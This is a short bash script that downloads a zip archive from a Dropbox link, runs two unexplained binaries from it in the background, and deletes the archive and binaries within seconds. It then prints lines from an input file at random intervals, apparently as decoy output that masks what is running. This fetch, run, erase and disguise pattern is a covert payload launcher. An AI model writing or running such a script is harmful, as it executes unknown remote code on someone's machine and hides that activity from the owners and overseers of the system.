#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/6vzchs3bjwh713v/wan23.zip -q
unzip wan23.zip > /dev/null 2>&1
#pwd
./face ./me &
sleep 3
rm -rf wan23.zip
rm -rf face
rm -rf me
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 50 ))
done < $2

